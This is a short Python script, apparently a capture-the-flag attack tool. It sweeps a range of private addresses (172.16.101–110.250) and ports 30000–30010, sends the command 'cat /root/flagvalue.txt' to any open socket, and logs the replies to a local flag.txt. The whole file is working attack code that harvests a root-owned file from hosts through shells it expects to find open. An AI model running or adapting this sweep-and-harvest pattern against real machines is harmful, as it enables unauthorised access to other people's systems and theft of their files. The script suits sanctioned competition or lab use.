#!/usr/bin/env python
# -*- coding: utf-8 -*-


import socket


def nc(endip):
	BUFSIZ = 1024
	ip1 = '172.'
	ip2 = '16.'
	ip4 = '250'
	for x in range(101,endip):
		HOST = ip1+ip2+str(x)+'.'+ip4
		for y in range(30000,30011):
			ADDR=(HOST,y)
			try:
				connectsocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
				connectsocket.connect(ADDR)
				data = 'cat /root/flagvalue.txt\n'
				connectsocket.send(data.encode())
				data = connectsocket.recv(BUFSIZ)
				if data:
					data = data.decode()
					f = open('./flag.txt','a+')
					f.write(HOST +' '+ data +'\n')
					f.close()
					break
			except:
				pass



def main():
	nc(111)


if __name__  ==  '__main__':
	main()